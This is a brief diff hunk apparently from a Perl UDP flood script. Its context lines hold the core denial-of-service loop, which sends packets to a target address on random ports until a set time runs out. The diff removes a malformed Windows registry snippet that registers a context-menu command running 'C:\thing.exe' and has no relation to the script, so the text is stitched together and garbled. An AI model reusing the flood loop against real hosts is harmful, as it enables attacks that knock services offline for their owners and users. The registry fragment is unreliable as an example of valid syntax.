@@ -33,7 +33,3 @@ for (;time() <= $endtime;) {
   $pport = $port ? $port : int(rand(65500))+1;
  
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
-  Windows Registry Editor Version 5.00
-
-[HKEY_CURRENT_USER\Software\Classes\Directory\Background\shell\Open Thing Here\command]
-@="C:\\thing.exe \"%1\"Right click"
